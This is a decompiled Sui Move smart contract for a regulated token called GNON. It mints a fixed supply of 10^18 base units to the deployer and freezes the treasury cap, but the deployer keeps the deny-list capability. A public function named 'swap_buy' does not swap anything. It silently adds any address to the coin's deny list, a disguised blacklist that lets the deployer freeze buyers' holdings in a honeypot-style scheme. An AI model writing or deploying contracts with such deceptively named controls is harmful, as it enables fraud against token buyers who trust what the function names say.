module 0x3e696675b1bae95e0f7036f5c337e4f8fc8e33ea09a6c352a625623ba3c07f1d::gnon {
    struct GNON has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: GNON, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<GNON>(arg0, 9, b"GNON", b"numogram ", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmSdsBzucP6LmmdN7z6Bo6bV69874sgqBWBuanxR4p3hk9"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<GNON>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<GNON>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<GNON>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<GNON>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GNON>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<GNON>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

